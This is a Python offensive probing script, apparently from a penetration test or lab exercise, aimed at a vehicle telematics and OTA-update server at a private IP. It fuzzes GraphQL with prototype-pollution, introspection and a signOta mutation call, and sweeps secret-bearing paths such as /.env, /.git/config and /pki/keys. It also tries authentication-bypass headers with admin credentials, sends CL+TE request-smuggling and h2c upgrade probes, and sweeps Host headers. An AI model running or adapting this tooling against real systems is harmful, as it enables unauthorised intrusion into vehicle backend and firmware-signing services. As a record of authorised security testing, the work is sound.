#!/usr/bin/env python3
"""
T01 TSP probe toolkit (read-only).

Subcommands:
  gql       semantic fuzz of /graphql body (what does the handler actually parse?)
  paths     targeted path wordlist sweep (TSP-specific, not in generic wordlist)
  hdrs      trust-header / proxy-header matrix
  raw       raw-socket teardown: chunked, expect-100, upgrade:h2c, malformed request lines
  vhosts    Host header sweep with baseline diff

All output is plain text meant to be teed into 03_EVIDENCE/tsp/.
"""
import argparse
import json
import socket
import ssl
import sys
import time

import requests

TARGET = "http://10.230.164.2:8080"
HOST = "10.230.164.2"
PORT = 8080

S = requests.Session()
S.headers.update({"User-Agent": "tsp-probe/1.0"})


def show(tag, r):
    body = r.content
    try:
        bt = body.decode("utf-8", "replace")
    except Exception:
        bt = repr(body)
    bt = bt.replace("\n", "\\n")
    if len(bt) > 300:
        bt = bt[:300] + f"...<{len(body)}B>"
    print(f"{tag}\n  {r.status_code} len={len(body)} ct={r.headers.get('Content-Type')!r} "
          f"loc={r.headers.get('Location')!r} body={bt!r}")


# ---------------------------------------------------------------- gql
GQL_CASES = [
    ("empty-object", "{}"),
    ("query-empty", '{"query":""}'),
    ("query-int", '{"query":123}'),
    ("query-null", '{"query":null}'),
    ("query-object", '{"query":{"a":1}}'),
    ("query-array", '{"query":["a"]}'),
    ("query-normal", '{"query":"{ vehicles { vin label } }"}'),
    ("query-realvin", '{"query":"{ vehicles(vin:\\"CV6FF52FEE9EDDD86\\") { vin label } }"}'),
    ("query-mutation", '{"query":"mutation { signOta(input:{vin:\\"CV6FF52FEE9EDDD86\\", url:\\"x\\"}) { ok } }"}'),
    ("query-garbage", '{"query":"!!!! not graphql !!!"}'),
    ("query-injection", '{"query":"{ __schema { types { name } } }"}'),
    ("opname", '{"query":"{vehicles{vin}}","operationName":"GetVehicles"}'),
    ("variables", '{"query":"query Q($v:String){vehicles(vin:$v){vin}}","variables":{"v":"CV6FF52FEE9EDDD86"}}'),
    ("variables-only", '{"variables":{"vin":"CV6FF52FEE9EDDD86"}}'),
    ("array-empty", "[]"),
    ("array-one", '[{"query":"{vehicles{vin}}"}]'),
    ("array-two", '[{"query":"a"},{"query":"b"}]'),
    ("null", "null"),
    ("true", "true"),
    ("int", "0"),
    ("string", '"hello"'),
    ("empty-string", '""'),
    ("dup-keys", '{"query":"a","query":"b"}'),
    ("trailing-data", '{} extra'),
    ("trailing-ws", '{}\n\n'),
    ("bom", "\ufeff{}"),
    ("invalid-utf8", b'{"query":"\xff\xfe"}'),
    ("unknown-keys", '{"foo":"bar","baz":[1,2,3]}'),
    ("nested-deep-200", '{"a":' * 200 + "1" + "}" * 200),
    ("big-1mb", '{"pad":"' + "A" * (1024 * 1024) + '"}'),
    ("big-4mb", '{"pad":"' + "A" * (4 * 1024 * 1024) + '"}'),
    ("huge-num", '{"n":1e99999}'),
    ("proto-pollute", '{"__proto__":{"admin":true},"constructor":{"prototype":{"x":1}}}'),
    ("role-field", '{"role":"admin","vin":"CV6FF52FEE9EDDD86","query":"{vehicles{vin}}"}'),
    ("auth-field", '{"token":"test","apiKey":"test","query":"{vehicles{vin}}"}'),
]


def cmd_gql(args):
    print("=" * 78)
    print(f"/graphql semantic fuzz  target={TARGET}")
    print("Question: does ANY part of the body change the response?")
    print("=" * 78)
    for name, payload in GQL_CASES:
        data = payload if isinstance(payload, bytes) else payload.encode("utf-8")
        try:
            r = S.post(TARGET + "/graphql", data=data, timeout=20,
                       headers={"Content-Type": "application/json"})
            show(f"[{name}] body={data[:80]!r}", r)
        except Exception as e:
            print(f"[{name}] EXC {type(e).__name__}: {e}")


# ---------------------------------------------------------------- paths
PATHS = r"""
/
/healthz
/healthz/ready
/readyz
/livez
/health
/health/
/status
/version
/versionz
/build
/buildinfo
/info
/metrics
/debug/vars
/debug/pprof/
/debug/pprof/cmdline
/debug/pprof/goroutine
/debug/pprof/symbol
/debug/requests
/debug/pprof/profile
/.well-known/jwks.json
/.well-known/security.txt
/.well-known/openid-configuration
/robots.txt
/sitemap.xml
/favicon.ico
/openapi.json
/openapi.yaml
/swagger.json
/swagger/
/docs
/docs/
/redoc
/graphiql
/playground
/voyager
/altair
/graphql/
/graphql/playground
/graphql/schema
/graphql/introspect
/api
/api/
/api/v1
/api/v1/
/api/v1/graphql
/api/graphql
/api/healthz
/api/ota
/api/ota/
/api/v1/ota
/apiv1
/gql
/query
/v1/graphql
/v1/
/v2/
/rest
/rpc
/jsonrpc
tsp
/tsp
/tsp/
/tsp/ota
/tsp/ota/
/tsp/vehicles
/tsp/keys
/tsp/sign
/ota
/ota/
/ota/manifest
/ota/manifests
/ota/campaign
/ota/campaigns
/ota/package
/ota/packages
/ota/download
/ota/zip
/ota/firmware
/ota/update
/ota/updates
/ota/status
/ota/check
/ota/vehicles
/ota/bin
/ota/blob
/ota/signed
/otas
/firmware
/firmware/
/firmware/list
/firmware/download
/firmware/latest
/firmware/manifest
/firmware/zip
/firmware/packages
/firmwares
/update
/updates
/packages
/packages/
/packages/latest
/package
/artifact
/artifacts
/blob
/blobs
/store
/files
/file
/download
/downloads
/upload
/sign
/signature
/signatures
/signing
/verify
/keys
/key
/pki
/pki/
/pki/ca
/pki/ca.crt
/pki/root
/pki/certs
/pki/keys
/ca
/ca.crt
/ca.pem
/certs
/cert
/certificate
/certificates
/root.crt
/rootCA.pem
/trust
/truststore
/jwks
/jwks.json
/token
/tokens
/auth
/auth/
/auth/token
/auth/login
/login
/logout
/session
/sessions
/user
/users
/me
/whoami
/account
/accounts
/admin
/admin/
/admin/ota
/admin/keys
/admin/users
/admin/debug
/internal
/internal/
/internal/ota
/internal/debug
/internal/keys
/private
/secret
/secrets
/config
/config.json
/settings
/env
/.env
/go.mod
/go.sum
/main.go
/Dockerfile
/docker-compose.yml
/.git/config
/.git/HEAD
/.gitignore
/backend
/server
/app
/cmd
/db
/sqlite
/data
/data/
/tmp
/static
/assets
/public
/web
/ui
/console
/dashboard
/portal
/fleet
/fleet/
/vehicles
/vehicles/
/vehicle
/vins
/vin
/tbox
/tbox/
/tbox/ota
/cgw
/ecu
/diagnostics
/diag
/telemetry
/provision
/provisioning
/enroll
/registration
/register
/report
/reports
/audit
/logs
/log
/trace
/traces
/actuator
/actuator/health
/actuator/env
/actuator/mappings
/server-status
/nginx_status
/phpinfo.php
/console/
/h2c
/echo
/ip
/ping
/probe
""".strip().splitlines()


def cmd_paths(args):
    print("=" * 78)
    print(f"Targeted path sweep (GET and POST)  target={TARGET}  n={len(PATHS)}")
    print("=" * 78)
    base = None
    hits = []
    for p in PATHS:
        p = p.strip()
        if not p:
            continue
        if not p.startswith("/"):
            p = "/" + p
        try:
            r = S.get(TARGET + p, timeout=10)
        except Exception as e:
            print(f"GET {p:34s} EXC {type(e).__name__}")
            continue
        # compare against the 404 template
        is404 = (r.status_code == 404 and r.content == b"404 page not found\n")
        if not is404:
            hits.append((p, "GET", r.status_code, r.content))
            show(f"GET {p:34s}", r)
    print("-" * 78)
    print("--- POST sweep (json body {}) ---")
    for p in PATHS:
        p = p.strip()
        if not p:
            continue
        if not p.startswith("/"):
            p = "/" + p
        try:
            r = S.post(TARGET + p, data=b"{}", timeout=10,
                       headers={"Content-Type": "application/json"})
        except Exception as e:
            print(f"POST {p:34s} EXC {type(e).__name__}")
            continue
        is404 = (r.status_code == 404 and r.content == b"404 page not found\n")
        if not is404:
            hits.append((p, "POST", r.status_code, r.content))
            show(f"POST {p:34s}", r)
    print("-" * 78)
    print(f"total interesting: {len(hits)}")
    for p, m, c, b in hits:
        print(f"  {m:5s} {c} {p} {b[:120]!r}")


# ---------------------------------------------------------------- hdrs
TRUST_HEADERS = [
    ("X-Forwarded-For", "127.0.0.1"),
    ("X-Forwarded-For", "127.0.0.1, 10.0.0.1"),
    ("X-Real-IP", "127.0.0.1"),
    ("X-Forwarded-Host", "internal"),
    ("X-Forwarded-Proto", "https"),
    ("X-Original-URL", "/admin"),
    ("X-Rewrite-URL", "/admin"),
    ("X-Original-URI", "/admin"),
    ("X-Client-IP", "127.0.0.1"),
    ("X-Remote-IP", "127.0.0.1"),
    ("X-Remote-Addr", "127.0.0.1"),
    ("X-Client-Cert", "-----BEGIN CERTIFICATE-----"),
    ("X-SSL-CLIENT-CERT", "-----BEGIN CERTIFICATE-----"),
    ("X-Forwarded-Client-Cert", "By=spiffe://x"),
    ("X-Authenticated-User", "admin"),
    ("X-Auth-User", "admin"),
    ("X-User", "admin"),
    ("X-Role", "admin"),
    ("X-Tenant", "internal"),
    ("X-VIN", "CV6FF52FEE9EDDD86"),
    ("X-Vehicle-VIN", "CV6FF52FEE9EDDD86"),
    ("X-TSP-Role", "admin"),
    ("X-TSP-Token", "admin"),
    ("X-Api-Key", "admin"),
    ("X-API-Token", "admin"),
    ("Api-Key", "admin"),
    ("Authorization", "Bearer admin"),
    ("Authorization", "Basic YWRtaW46YWRtaW4="),
    ("Authorization", "Basic dHNwOnRzcA=="),
    ("Cookie", "role=admin; authenticated=1; session=admin"),
    ("Cookie", "token=admin"),
    ("Referer", "http://127.0.0.1/admin"),
    ("Origin", "http://127.0.0.1"),
    ("Forwarded", "for=127.0.0.1;proto=https;host=internal"),
    ("True-Client-IP", "127.0.0.1"),
    ("CF-Connecting-IP", "127.0.0.1"),
    ("X-ProxyUser", "admin"),
    ("Proxy-Authorization", "Basic YWRtaW46YWRtaW4="),
]


def cmd_hdrs(args):
    print("=" * 78)
    print(f"Trust / proxy header matrix on POST /graphql  target={TARGET}")
    print("=" * 78)
    print("--- baseline ---")
    try:
        r = S.post(TARGET + "/graphql", data=b"{}", timeout=10,
                   headers={"Content-Type": "application/json"})
        show("baseline", r)
        base_body = r.content
        base_status = r.status_code
    except Exception as e:
        print(f"baseline EXC {e}")
        return
    print("--- header variants (only non-baseline or status change reported verbosely) ---")
    for h, v in TRUST_HEADERS:
        try:
            r = S.post(TARGET + "/graphql", data=b"{}", timeout=10,
                       headers={"Content-Type": "application/json", h: v})
        except Exception as e:
            print(f"{h}: {v!r:40s} EXC {type(e).__name__}")
            continue
        same = (r.status_code == base_status and r.content == base_body)
        if same:
            print(f"{h}: {v!r:40s} SAME {r.status_code}")
        else:
            show(f"{h}: {v!r:40s} DIFF", r)
    print("--- header variants on GET /healthz (diff check) ---")
    base = S.get(TARGET + "/healthz", timeout=10)
    for h, v in TRUST_HEADERS[:20]:
        r = S.get(TARGET + "/healthz", timeout=10, headers={h: v})
        if not (r.status_code == base.status_code and r.content == base.content):
            show(f"GET /healthz {h}: {v!r}", r)


# ---------------------------------------------------------------- raw
def raw_exchange(payload, tag, read_timeout=6.0):
    print(f"--- {tag} ---")
    print(f"REQ  {payload[:200]!r}")
    try:
        s = socket.create_connection((HOST, PORT), timeout=6)
    except Exception as e:
        print(f"  connect EXC {e}")
        return
    s.settimeout(read_timeout)
    try:
        s.sendall(payload)
        chunks = []
        deadline = time.time() + read_timeout
        while time.time() < deadline:
            try:
                d = s.recv(65536)
            except socket.timeout:
                break
            if not d:
                break
            chunks.append(d)
            if len(b"".join(chunks)) > 200000:
                break
        raw = b"".join(chunks)
        print(f"RESP {raw[:600]!r}")
        if len(raw) > 600:
            print(f"     ...<{len(raw)}B total>")
    except Exception as e:
        print(f"  send/recv EXC {type(e).__name__}: {e}")
    finally:
        try:
            s.close()
        except Exception:
            pass
    print()


def cmd_raw(args):
    print("=" * 78)
    print(f"Raw socket teardown  target={HOST}:{PORT}")
    print("=" * 78)
    J = {"Content-Type": "application/json"}
    raw_exchange(
        b"POST /graphql HTTP/1.1\r\nHost: 10.230.164.2:8080\r\nContent-Type: application/json\r\n"
        b"Content-Length: 2\r\n\r\n{}", "plain POST {} (baseline)")
    raw_exchange(
        b"POST /graphql HTTP/1.1\r\nHost: 10.230.164.2:8080\r\nContent-Type: application/json\r\n"
        b"Transfer-Encoding: chunked\r\n\r\n2\r\n{}\r\n0\r\n\r\n", "chunked body")
    raw_exchange(
        b"POST /graphql HTTP/1.1\r\nHost: 10.230.164.2:8080\r\nContent-Type: application/json\r\n"
        b"Content-Length: 2\r\nExpect: 100-continue\r\n\r\n{}", "Expect: 100-continue")
    raw_exchange(
        b"POST /graphql HTTP/1.1\r\nHost: 10.230.164.2:8080\r\nContent-Type: application/json\r\n"
        b"Content-Length: 100\r\n\r\n{}", "Content-Length 100 but only 2 bytes sent (truncated)")
    raw_exchange(
        b"GET /graphql HTTP/1.1\r\nHost: 10.230.164.2:8080\r\nConnection: Upgrade, HTTP2-Settings\r\n"
        b"Upgrade: h2c\r\nHTTP2-Settings: AAMAAABkAAQAAP__\r\n\r\n", "h2c upgrade via RFC7540 Upgrade")
    raw_exchange(
        b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n", "bare h2 preface (re-confirm non-h2c)")
    raw_exchange(
        b"POST /graphql HTTP/1.1\r\nHost: 10.230.164.2:8080\r\nContent-Type: application/json\r\n"
        b"Content-Length: 2\r\n\r\n{}GET /healthz HTTP/1.1\r\nHost: 10.230.164.2:8080\r\n\r\n",
        "pipelined: POST /graphql then GET /healthz")
    raw_exchange(
        b"OPTIONS * HTTP/1.1\r\nHost: 10.230.164.2:8080\r\n\r\n", "OPTIONS * (server-wide)")
    raw_exchange(
        b"GET http://internal/graphql HTTP/1.1\r\nHost: 10.230.164.2:8080\r\n\r\n",
        "absolute-form request URI")
    raw_exchange(
        b"GET /graphql HTTP/1.0\r\n\r\n", "HTTP/1.0 no Host")
    raw_exchange(
        b"POST /graphql HTTP/1.1\r\nHost: 10.230.164.2:8080\r\nContent-Type: application/json\r\n"
        b"Content-Length: 2\r\nTransfer-Encoding: chunked\r\n\r\n2\r\n{}\r\n0\r\n\r\n",
        "CL+TE smuggling probe (both headers)")
    raw_exchange(
        b"POST /graphql HTTP/1.1\r\nHost: 10.230.164.2:8080\r\nContent-Type: application/json\r\n"
        b"Content-Length: 2\r\n\r\n{}", "keep-alive: two requests same conn", read_timeout=3)


def cmd_vhosts(args):
    print("=" * 78)
    print(f"Host sweep (baseline diff)  target={TARGET}")
    print("=" * 78)
    names = ["tsp", "tsp.local", "tsp.internal", "internal", "internal.local",
             "tbox", "tbox.local", "cgw", "cgw.local", "bcm", "bms", "vcu",
             "admin", "admin.local", "api", "api.local", "ota", "ota.local",
             "fleet", "fleet.local", "cv6", "cv6.local", "cybercar",
             "graphql", "gateway", "proxy", "backend", "app", "server",
             "localhost", "127.0.0.1", "10.230.164.2", "10.230.164.3",
             "vehicles", "diagnostics", "pki", "ca", "store", "cdn"]
    base = S.get(TARGET + "/healthz", timeout=10)
    print(f"baseline /healthz: {base.status_code} {base.content!r} "
          f"len={len(base.content)}")
    for n in names:
        for path in ("/healthz", "/graphql"):
            try:
                if path == "/graphql":
                    r = S.get(TARGET + path, timeout=10, headers={"Host": n})
                else:
                    r = S.get(TARGET + path, timeout=10, headers={"Host": n})
            except Exception as e:
                print(f"Host {n:18s} {path:10s} EXC {type(e).__name__}")
                continue
            diff = ""
            if path == "/healthz":
                if not (r.status_code == base.status_code and r.content == base.content):
                    diff = "  <<< DIFF"
            if diff or r.status_code not in (200, 405):
                print(f"Host {n:18s} {path:10s} {r.status_code} len={len(r.content)}{diff}")
    print("(only anomalies printed; absence of lines = all baseline)")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("cmd", choices=["gql", "paths", "hdrs", "raw", "vhosts"])
    args = ap.parse_args()
    {"gql": cmd_gql, "paths": cmd_paths, "hdrs": cmd_hdrs,
     "raw": cmd_raw, "vhosts": cmd_vhosts}[args.cmd](args)


if __name__ == "__main__":
    main()
